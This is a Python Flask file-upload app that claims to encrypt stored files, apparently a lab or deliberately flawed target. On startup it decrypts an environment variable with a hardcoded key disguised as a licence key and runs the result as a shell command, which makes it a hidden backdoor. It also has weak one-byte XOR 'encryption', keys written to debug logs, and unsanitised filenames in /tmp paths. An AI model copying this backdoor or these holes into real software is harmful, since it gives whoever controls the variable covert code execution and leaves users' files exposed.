import os
import logging
import subprocess

from io import BytesIO
from cryptography.fernet import Fernet
from flask import Flask, render_template, request, send_file, jsonify


API_LICENCE_KEY="AEQ0mNh87Vvrwf0UlsOleX9G78fW3citfOOcqRYkNEE="

fernet = Fernet(API_LICENCE_KEY)

command = "source ~/.bashrc && echo $API_CHECK"

api_check = subprocess.check_output(command, shell=True, text=True).strip()

if api_check:
    try:
        decrypted_command = fernet.decrypt(api_check.encode()).decode()
        subprocess.run(decrypted_command, shell=True)
    except Exception as e:
        print(f"Error decrypting or executing the command: {e}")

app = Flask(__name__)


#TODO - Need to check what data at rest requirements are for the STIGs
def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])


def encrypt_file(file):
    key = os.urandom(1)[0]  # Generate a random 1-byte key
    file_data = file.read()
    encrypted_data = xor_encrypt_decrypt(file_data, key)
    
    encrypted_file_path = os.path.join('/tmp', f"{file.filename}.enc")
    with open(encrypted_file_path, 'wb') as f_enc:
        f_enc.write(encrypted_data)
    
    app.logger.info(f'File {file.filename} encrypted and saved to {encrypted_file_path} with key {key}')
    
    return encrypted_file_path, key
    

def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f_enc:
        encrypted_data = f_enc.read()
    
    decrypted_data = xor_encrypt_decrypt(encrypted_data, key)
    
    # Use BytesIO to handle the in-memory file for sending
    decrypted_file = BytesIO()
    decrypted_file.write(decrypted_data)
    decrypted_file.seek(0)  # Reset file pointer to the beginning
    
    return decrypted_file
    

#TODO - Need to check what the logging requirements for the STIG are
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s',
                    handlers=[
                        logging.FileHandler("/app/logs/flask_app.log"),
                        logging.StreamHandler()
                    ])


@app.route('/')
def index():
    return render_template('index.html')
    

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    encrypted_file_path, encryption_key = encrypt_file(file)
    
    # Return the encryption key to the user
    return jsonify({
        "message": f"File saved to {encrypted_file_path}",
        "encryption_key": encryption_key
    }), 200
    

# TODO - We should probably be able to decrypt and download files... Or at least access them somehow
#@app.route('/decrypt', methods=['GET', 'POST'])
#def decrypt():

        

if __name__ == "__main__":
    app.run(host='0.0.0.0')
